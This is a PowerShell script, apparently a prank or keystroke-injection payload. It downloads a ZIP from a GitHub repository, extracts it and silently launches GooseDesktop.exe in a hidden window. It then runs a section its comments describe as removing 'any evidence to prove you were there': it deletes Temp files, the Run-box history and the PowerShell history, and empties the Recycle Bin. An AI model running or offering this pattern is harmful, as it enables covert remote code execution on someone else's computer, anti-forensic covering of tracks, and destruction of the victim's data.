# PowerShell Script: Goose.ps1

# Define variables
$githubRepoUrl = "https://github.com/cdneeee/Goose"
$downloadPath = "$env:USERPROFILE\Documents\Goose-main.zip"
$extractPath = "$env:USERPROFILE\Documents\Goose-main"

# Download the repository as a ZIP
Invoke-WebRequest -Uri "$githubRepoUrl/archive/refs/heads/main.zip" -OutFile $downloadPath

# Extract the ZIP file
Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force

# Navigate to the folder with GooseDesktop.exe
Set-Location "$extractPath\Goose-main"

# Run GooseDesktop.exe silently
Start-Process -FilePath ".\GooseDesktop.exe" -WindowStyle Hidden

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue